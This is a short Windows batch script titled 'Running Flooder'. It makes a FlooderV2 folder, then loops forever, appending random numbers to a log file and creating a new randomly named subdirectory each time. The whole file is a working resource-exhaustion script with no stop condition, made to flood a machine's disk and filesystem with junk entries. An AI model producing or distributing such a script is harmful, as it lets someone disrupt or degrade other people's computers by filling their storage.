@echo off

title Running Flooder

color 0A

set "dir=FlooderV2"

mkdir %dir%

:start

echo Running Flooder

echo %random% >> %dir%\log.txt

mkdir %dir%\%random%

goto start
